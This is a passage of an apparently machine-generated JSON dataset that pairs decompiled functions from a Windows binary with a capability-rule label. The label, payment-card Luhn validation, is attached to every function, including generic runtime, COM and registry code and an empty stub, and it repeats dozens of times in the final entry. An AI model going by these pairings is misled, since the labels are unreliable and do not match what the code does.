        "decompiled_code": "\nuint * __thiscall fcn.0045c5de(uint *param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00411579(-(param_2 * 4 >> 0x20 != 0) | param_2 * 4);\n    *param_1 = uVar1;\n    fcn.00462290(uVar1, 0, param_2 << 2);\n    param_1[1] = param_2;\n    return param_1;\n}\n",
        "token_count": 120
    },
    "0045c783": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0045c783(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char *arg_ch_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    char **ppcVar2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x10);\n    uVar1 = fcn.0042407a();\n    fcn.0040f840(uVar1);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.0042407a();\n    fcn.0040f840(uVar1);\n    *(unaff_EBP + -0x14) = 0;\n    if (*(unaff_EBP + 0x14) == -0x80000000) {\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000000, \"CLSID\", 0, 0x20019, unaff_EBP + -0x14);\n    }\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x14);\n    ppcVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 2;\n    while (arg_ch_00 = *ppcVar2,  arg_ch_00 != NULL) {\n        ppcVar2 = ppcVar2 + 1;\n        if ((*(unaff_EBP + 0x14) != -0x80000000) || (*arg_ch_00 != '\\0')) {\n            fcn.00431e30(unaff_EBP + -0x10, arg_ch_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n            if ((*(unaff_EBP + 0x14) != -0x80000000) || (*(*(unaff_EBP + -0x10) + -0xc) != 0)) {\n                fcn.0043dd1a(*(unaff_EBP + -0x10));\n            }\n        }\n    }\n    fcn.0043c894();\n    fcn.00402740();\n    fcn.00402740();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 617
    },
    "0045cf98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0045cf98(uint8_t *param_1, uint16_t param_2)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (0x15 < param_2) {\n        fcn.00411e42();\n    }\n    iVar3 = *(param_2 * 4 + 0x49c5e8) + 4;\n    do {\n        uVar1 = *param_1;\n        if (uVar1 == 0) {\n            return iVar3;\n        }\n        if (uVar1 != 0xff) {\n            iVar4 = 0x49c590;\n            if ((uVar1 & 0x40) == 0) {\n                iVar4 = 0x49c538;\n            }\n            if (0x15 < (uVar1 & 0xbf)) {\n                fcn.00411e42();\n                pcVar2 = swi(3);\n                iVar3 = (*pcVar2)();\n                return iVar3;\n            }\n            iVar3 = iVar3 + *(iVar4 + (uVar1 & 0xbf) * 4);\n        }\n        param_1 = param_1 + 1;\n    } while( true );\n}\n",
        "token_count": 286
    },
    "0045d400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0045d400(int32_t param_1, int32_t param_2, int16_t *param_3, uint *param_4)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    ulong *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    puVar3 = *(param_2 + 0x18) + param_1;\n    if (*(param_2 + 0xc) != 0xc) {\n        *param_3 = *(param_2 + 0xc);\n    }\n    // switch table (20 cases) at 0x45d49c\n    switch(*(param_2 + 0xc)) {\n    case 2:\n    case 0x12:\n        iVar2 = *puVar3;\n        goto code_r0x0045d438;\n    case 3:\n    case 10:\n    case 0x13:\n        uVar4 = *puVar3;\n        goto code_r0x0045d440;\n    case 4:\n        *(param_3 + 4) = *puVar3;\n        break;\n    case 5:\n    case 7:\n        *(param_3 + 4) = *puVar3;\n        break;\n    case 6:\n    case 0x14:\n    case 0x15:\n        *(param_3 + 4) = *puVar3;\n        *(param_3 + 6) = *(puVar3 + 4);\n        break;\n    case 8:\n        uVar4 = fcn.00418db4();\ncode_r0x0045d440:\n        *(param_3 + 4) = uVar4;\n        break;\n    case 9:\n    case 0xd:\n        piVar1 = *puVar3;\n        *(param_3 + 4) = piVar1;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 4))(piVar1);\n        }\n        break;\n    case 0xb:\n        iVar2 = -(*puVar3 != 0);\ncode_r0x0045d438:\n        param_3[4] = iVar2;\n        break;\n    case 0xc:\n        iVar5 = (*_sym.imp.OLEAUT32.dll_VariantCopyInd)(param_3, puVar3);\n        if (iVar5 == 0) {\n            return;\n        }\n    default:\n        *param_4 = 0;\n        break;\n    case 0x10:\n    case 0x11:\n        *(param_3 + 4) = *puVar3;\n    }\n    return;\n}\n",
        "token_count": 584
    },
    "0045e5cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045e5cc(int32_t *param_1, int32_t *param_2, int32_t **param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t **in_FS_OFFSET;\n    uchar *arg_8h;\n    uchar *puVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t *piStack284;\n    int32_t *arg_8h_00;\n    uint uStack268;\n    uint32_t uStack8;\n    \n    arg_8h = &stack0xfffffef4;\n    uStack8 = *0x4b8030 ^ arg_8h;\n    uStack268 = 0x18;\n    fcn.004627af();\n    fcn.0043039f();\n    piVar1 = (**(*extraout_ECX + 0x20))();\n    piStack284 = param_1;\n    arg_8h_00 = param_2;\n    iVar2 = fcn.0045e57e();\n    if (iVar2 == 0) {\n        piVar6 = &stack0xfffffee4;\n        piVar1 = param_1;\n        iVar2 = fcn.0045e3e2(param_1, piVar6);\n        if (iVar2 == 0) {\n            iVar2 = (**(*extraout_ECX + 0x24))(param_1, &stack0xfffffee4);\n            if (iVar2 < 0) {\n                fcn.00430303(extraout_ECX[7]);\n                iVar2 = fcn.0043026e();\n                iVar2 = *(iVar2 + 8);\n                uVar5 = 0x104;\n                puVar4 = arg_8h;\n                (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar2, arg_8h, 0x104);\n                fcn.0041442c(arg_8h);\n                iVar3 = (*_sym.imp.OLEAUT32.dll_LoadRegTypeLib)(puVar4, &stack0xfffffee4);\n                if (iVar3 < 0) {\n                    piStack284 = NULL;\n                }\n                fcn.00402740();\n                if (iVar2 != 0) {\n                    piStack284 = NULL;\n                    fcn.0042f689(uVar5, arg_8h);\n                }\n            }\n            piVar1 = param_1;\n            piVar6 = piStack284;\n            fcn.0045e413(param_1, piStack284);\n        }\n        if (piStack284 != NULL) {\n            (**(*piStack284 + 0x18))(piStack284, param_2, param_3);\n            (**(*piStack284 + 8))(piStack284);\n            piStack284 = *param_3;\n            fcn.0045e456(param_1, param_2);\n            piVar1 = param_1;\n            piVar6 = param_2;\n        }\n    }\n    else {\n        piVar6 = NULL;\n    }\n    fcn.0043040c(0xd, piVar1, piVar6);\n    *in_FS_OFFSET = arg_8h_00;\n    piStack284 = 0x45e72c;\n    fcn.0045e747(arg_8h_00);\n    return;\n}\n",
        "token_count": 752
    },
    "0045e736": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045e736(code *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint unaff_retaddr;\n    \n    *(param_2 + param_3) = unaff_retaddr;\n    *((param_2 + param_3) - param_3) = 0x45e746;\n    (*param_1)();\n    return;\n}\n",
        "token_count": 87
    },
    "0045f070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0045f070(code **param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    *param_1 = vtable.std::exception.0;\n    pcVar3 = *(param_2 + 8);\n    param_1[2] = pcVar3;\n    pcVar1 = *(param_2 + 4);\n    if (pcVar3 == NULL) {\n        param_1[1] = pcVar1;\n    }\n    else if (pcVar1 == NULL) {\n        param_1[1] = NULL;\n    }\n    else {\n        iVar2 = fcn.00462ab0(pcVar1);\n        pcVar3 = fcn.0045ea05(iVar2 + 1);\n        param_1[1] = pcVar3;\n        if (pcVar3 != NULL) {\n            fcn.00463e16(pcVar3, iVar2 + 1, *(param_2 + 4));\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 244
    },
    "00462ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462ee0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0046cd67(arg_8h, arg_ch, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 76
    },
    "00463145": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00463145(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00463054(fcn.0046ce3e, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "00463358": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00463358(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00463054(0x46e401, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 114
    },
    "00463402": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463402(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00463380(0x46f44e, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 74
    },
    "00463424": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00463424(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.00463380(0x47014f, param_3, 0, &stack0x00000010);\n    return;\n}\n",
        "token_count": 57
    },
    "00463445": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463445(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00463380(0x47014f, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 73
    },
    "00463590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463590(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00463358(arg_8h, arg_ch, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 74
    },
    "00463796": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00463796(uint param_1, uint param_2)\n\n{\n    fcn.00463741(fcn.0046ce3e, param_1, 0, param_2);\n    return;\n}\n",
        "token_count": 50
    },
    "00463a95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00463a95(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 != NULL) && (*0x4bb708 != 0)) {\n        *param_1 = *0x4bb708;\n        return 0;\n    }\n    puVar1 = fcn.00462f86();\n    *puVar1 = 0x16;\n    fcn.00466eae(0, 0, 0, 0, 0);\n    return 0x16;\n}\n",
        "token_count": 122
    },
    "00463b44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00463b44(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 != NULL) && (*0x4bb708 != 0)) {\n        *param_1 = *0x4bb714;\n        return 0;\n    }\n    puVar1 = fcn.00462f86();\n    *puVar1 = 0x16;\n    fcn.00466eae(0, 0, 0, 0, 0);\n    return 0x16;\n}\n",
        "token_count": 120
    },
    "00463f23": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00463f23(uint param_1, uint param_2)\n\n{\n    fcn.00463e7b(0x47014f, param_2, 0, &stack0x0000000c);\n    return;\n}\n",
        "token_count": 56
    },
    "00464a46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00464a46(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 306
    },
    "00468bf2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00468c04)\n// WARNING: Removing unreachable block (ram,0x00468c0a)\n// WARNING: Removing unreachable block (ram,0x00468c0c)\n\nvoid fcn.00468bf2(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "0046cb51": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046cb51(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0046ca34(fcn.0046bfb4, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 118
    },
    "0046cd67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046cd67(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0046ca34(0x47d6a2, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 118
    },
    "00472d8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00472d8d(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    if (param_1 == NULL) {\n        puVar1 = fcn.00462f86();\n        *puVar1 = 0x16;\n        fcn.00466eae(0, 0, 0, 0, 0);\n        return 0x16;\n    }\n    *param_1 = *0x4b8b04;\n    return 0;\n}\n",
        "token_count": 112
    },
    "00472dc1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00472dc1(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    if (param_1 == NULL) {\n        puVar1 = fcn.00462f86();\n        *puVar1 = 0x16;\n        fcn.00466eae(0, 0, 0, 0, 0);\n        return 0x16;\n    }\n    *param_1 = *0x4b8b08;\n    return 0;\n}\n",
        "token_count": 111
    },
    "00472df5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00472df5(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    if (param_1 == NULL) {\n        puVar1 = fcn.00462f86();\n        *puVar1 = 0x16;\n        fcn.00466eae(0, 0, 0, 0, 0);\n        return 0x16;\n    }\n    *param_1 = *0x4b8b00;\n    return 0;\n}\n",
        "token_count": 111
    },
    "0047cfcf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047cfcf(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0047cb30();\n    fcn.0047cc88(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 56
    },
    "00481b89": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00481b89(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004637fc(0x4b0ce8, 0x10);\n    iVar1 = fcn.0047cb30();\n    iVar1 = iVar1 + 0x20;\n    *(unaff_EBP + -0x1c) = iVar1;\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar2 = fcn.00462f86();\n        *puVar2 = 0x16;\n        fcn.00466eae(0, 0, 0, 0, 0);\n    }\n    else {\n        fcn.0047cc07(iVar1);\n        *(unaff_EBP + -4) = 0;\n        uVar3 = fcn.00481ac4(iVar1);\n        uVar4 = (**(unaff_EBP + 8))(iVar1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar4;\n        fcn.00481b5a(uVar3, iVar1);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00481c11();\n    }\n    fcn.00463841();\n    return;\n}\n",
        "token_count": 434
    },
    "004884ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004884ce(uint param_1)\n\n{\n    fcn.00462290(param_1, 0, 0x18);\n    return param_1;\n}\n",
        "token_count": 42
    },
    "004885e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004885e0(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if ((param_2 < 0) || (iVar1 = param_1[1],  iVar1 <= param_2)) {\n        uVar3 = 0;\n    }\n    else {\n        if (param_2 != iVar1 + -1) {\n            iVar2 = (iVar1 - param_2) * 4;\n            iVar1 = *param_1 + param_2 * 4;\n            fcn.00429a2a(iVar1, iVar2, iVar1 + 4, iVar2 + -4);\n        }\n        param_1[1] = param_1[1] + -1;\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 203
    },
    "00488821": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00488821(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (param_1[1] == param_1[2]) {\n        if (param_1[2] == 0) {\n            uVar3 = 1;\ncode_r0x00488847:\n            iVar1 = fcn.0045ee31(*param_1, uVar3, 4);\n            if (iVar1 != 0) {\n                param_1[2] = uVar3;\n                *param_1 = iVar1;\n                goto code_r0x0048885d;\n            }\n        }\n        else {\n            uVar3 = param_1[1] * 2;\n            if ((-1 < uVar3) && (uVar3 < 0x20000000)) goto code_r0x00488847;\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x0048885d:\n        fcn.0048864a(param_1[1], param_2);\n        param_1[1] = param_1[1] + 1;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 290
    },
    "00462421": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
